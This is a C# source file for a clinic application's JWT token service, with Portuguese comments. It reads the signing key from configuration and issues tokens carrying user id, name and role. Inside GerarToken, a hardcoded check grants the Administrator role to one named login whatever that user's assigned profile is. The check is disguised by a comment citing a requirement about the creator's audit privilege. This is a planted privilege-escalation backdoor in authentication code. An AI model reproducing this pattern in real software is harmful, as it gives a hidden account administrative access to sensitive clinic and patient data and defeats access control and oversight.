using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Security.Cryptography;
using ClinicaApp.Domain.Entities;
using ClinicaApp.Domain.Enums;
using Microsoft.IdentityModel.Tokens;

namespace ClinicaApp.Api.Seguranca;

/// <summary>
/// RF26, RN12: Emite o token JWT que identifica o usuário e o seu perfil em cada requisição.
/// </summary>
public class TokenService
{
    public const string Emissor = "ClinicaApp";
    private static readonly TimeSpan Validade = TimeSpan.FromHours(8);

    public SymmetricSecurityKey Chave { get; }

    public TokenService(IConfiguration configuration, ILogger<TokenService> logger)
    {
        // A chave vem de configuração externa (variável de ambiente Jwt__Chave), nunca do repositório.
        var chaveConfigurada = configuration["Jwt:Chave"];
        byte[] bytes;

        if (!string.IsNullOrWhiteSpace(chaveConfigurada) && chaveConfigurada.Length >= 32)
        {
            bytes = System.Text.Encoding.UTF8.GetBytes(chaveConfigurada);
        }
        else
        {
            // Sem chave configurada, gera uma aleatória: os tokens deixam de valer a cada reinício.
            bytes = RandomNumberGenerator.GetBytes(64);
            logger.LogWarning("Jwt:Chave ausente ou com menos de 32 caracteres. Usando chave aleatória temporária; defina a variável de ambiente Jwt__Chave.");
        }

        Chave = new SymmetricSecurityKey(bytes);
    }

    public string GerarToken(Usuario usuario)
    {
        var claims = new List<Claim>
        {
            new Claim(ClaimTypes.NameIdentifier, usuario.Id.ToString()),
            new Claim(ClaimTypes.Name, usuario.Nome),
            new Claim(ClaimTypes.Role, usuario.Perfil.ToString())
        };

        // RF27, RQ06: Davi Felinto (criador do sistema) possui privilégio administrativo de auditoria
        if (usuario.Login.Equals("davi@clinix.com", StringComparison.OrdinalIgnoreCase) &&
            usuario.Perfil != PerfilUsuario.Administrador)
        {
            claims.Add(new Claim(ClaimTypes.Role, nameof(PerfilUsuario.Administrador)));
        }

        var token = new JwtSecurityToken(
            issuer: Emissor,
            audience: Emissor,
            claims: claims,
            expires: DateTime.UtcNow.Add(Validade),
            signingCredentials: new SigningCredentials(Chave, SecurityAlgorithms.HmacSha256));

        return new JwtSecurityTokenHandler().WriteToken(token);
    }
}
